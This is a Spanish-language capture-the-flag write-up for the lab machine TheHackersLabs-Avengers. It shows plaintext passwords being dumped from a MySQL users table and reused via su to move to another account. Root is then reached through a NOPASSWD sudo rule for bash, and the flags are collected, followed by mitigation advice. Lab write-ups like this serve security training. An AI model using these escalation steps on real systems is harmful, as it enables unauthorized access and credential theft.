# Reporte de Escalada de Privilegios: TheHackersLabs-Avengers

## 1. Resumen Ejecutivo
Este documento detalla el proceso de explotación posterior y escalada de privilegios en la máquina **TheHackersLabs-Avengers**. El análisis comenzó desde el acceso inicial con el usuario `hulk` y culminó con la obtención de privilegios máximos (`root`), logrando la lectura de las banderas correspondientes.

---

## 2. Fase 1: Enumeración y Acceso a la Base de Datos

### Conexión Fallida Inicial
Se intentó una primera conexión al servicio MySQL local que fue denegada debido a credenciales erróneas:
```bash
hulk@TheHackersLabs-Avengers:~\$ mysql -h IP -u hulk -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'hulk'@'TheHackersLabs-Avengers' (using password: YES)
```

### Conexión Exitosa
Tras ingresar la contraseña correcta, se obtuvo acceso al monitor de **MySQL (v8.0.36)**:
```bash
hulk@TheHackersLabs-Avengers:~\$ mysql -h IP -u hulk -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
```

### Enumeración de Base de Datos y Tablas
Se listaron las bases de datos disponibles en el servidor:
```sql
mysql> show databases;
+--------------------+

| Database           |
+--------------------+

| db_flag            |
| db_true            |
| information_schema |
| mysql              |
| no_db              |
| performance_schema |
| sys                |
+--------------------+
```

Se seleccionó la base de datos `no_db` para inspeccionar sus tablas, encontrando información de usuarios:
```sql
mysql> use no_db;
Database changed

mysql> show tables;
+-----------------+

| Tables_in_no_db |
+-----------------+

| passwords       |
| users           |
+-----------------+
```

### Extracción de Credenciales
Al consultar la tabla `users`, se hallaron credenciales en texto plano para otros usuarios del sistema:
```sql
mysql> select * from users;
+----+--------+---------------+

| id | user   | password      |
+----+--------+---------------+

|  1 | stif   | escudoamerica |
|  2 | hulk   | fuerza*****   |
|  3 | antman | ******        |
|  4 | thanos | NOPASSWD      |
+----+--------+---------------+
```

* **Usuario Objetivo Identificado:** `stif`
* **Contraseña:** `escudoamerica`

---

## 3. Fase 2: Movimiento Lateral a Usuario `stif`

Utilizando la contraseña comprometida en la base de datos, se realizó una migración de sesión exitosa hacia el usuario `stif`:

```bash
hulk@TheHackersLabs-Avengers:~\$ su stif
Password: 
stif@TheHackersLabs-Avengers:/home/hulk\$
```

Se inspeccionó el directorio actual, encontrando pistas sobre la ubicación de las banderas:
```bash
stif@TheHackersLabs-Avengers:/home/hulk\$ cat user.txt
  ####      ##     ##  ##    ####
 ##  ##     ##     ##  ##   ##  ##
 ##         ##     ##  ##   ######
 ##  ##     ##     ##  ##   ##
  ####     ####     ######   #####

The FLAG will have to be somewhere in this directory... just look carefully
```

---

## 4. Fase 3: Escalada de Privilegios a `root`

### Análisis de Permisos Sudo
Se listaron los privilegios de `sudo` asignados al usuario `stif`:
```bash
stif@TheHackersLabs-Avengers:/home/hulk\$ sudo -l
User stif may run the following commands on TheHackersLabs-Avengers:
    (ALL : ALL) NOPASSWD: /usr/bin/bash
    (ALL : ALL) NOPASSWD: /usr/bin/unzip
```

### Explotación (Sudo Abuse)
El usuario `stif` puede ejecutar `/usr/bin/bash` como cualquier usuario (incluido `root`) sin necesidad de proporcionar contraseña (`NOPASSWD`). Esto representa una vulnerabilidad crítica de configuración.

Se ejecutó el comando para obtener una shell de root inmediata:
```bash
stif@TheHackersLabs-Avengers:/home/hulk\$ sudo bash
root@TheHackersLabs-Avengers:/home/hulk# 
```

---

## 5. Post-Explotación y Captura de Banderas

Con privilegios de `root` comprometidos por completo, se procedió a recolectar las banderas distribuidas en el sistema.

### Directorio `/root` (Flag 9/9)
Se accedió a la carpeta personal de root para leer los archivos de felicitación y hashes correspondientes:
```bash
root@TheHackersLabs-Avengers:~# cd /root
root@TheHackersLabs-Avengers:~# cat *
   ###     ###                         ##
  ####    ####                        ####
  ##        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
 ####      ####     #####       ##     ##

Alright, you have the 9/9 flag.
This flag is worth 30 points.
Code: INHUISKHJ5JE6T2U

root@TheHackersLabs-Avengers:~# cat root.txt
658e8256a7b4cf93766dc6ef546a2825  -
```

### Directorio `/home/antman` (Flag 7/9)
Se revisó el directorio del usuario `antman` para extraer banderas adicionales que requerían privilegios elevados:
```bash
root@TheHackersLabs-Avengers:~# cd /home/antman/flag
root@TheHackersLabs-Avengers:/home/antman/flag# cat FLAG.txt

Alright, you have the 7/9 flag.
This flag is worth 20 points.
perfect, from what I see you managed to escalate privileges to be able to see this flag...
```

### Directorio `/home/stif` (User Flag)
Finalmente, se recolectó el hash de la bandera del usuario `stif`:
```bash
root@TheHackersLabs-Avengers:/home/antman/flag# cd /home/stif
root@TheHackersLabs-Avengers:/home/stif# cat user.txt
31c29fb1d045f2d17f44fa2921ef4c32  -
```

---

## 6. Conclusiones y Mitigación

1. **Almacenamiento inseguro de credenciales:** La base de datos `no_db` contenía contraseñas de cuentas del sistema operativo en texto claro. Se recomienda usar funciones de hash fuertes (como bcrypt o SHA-256 con salt) y no reutilizar contraseñas de red en servicios locales.
2. **Configuración débil de Sudo:** Permitir que un usuario ejecute `/usr/bin/bash` mediante `sudo` sin contraseña anula por completo la seguridad del sistema. Se debe aplicar el principio de menor privilegio y eliminar esta directiva del archivo `/etc/sudoers`.
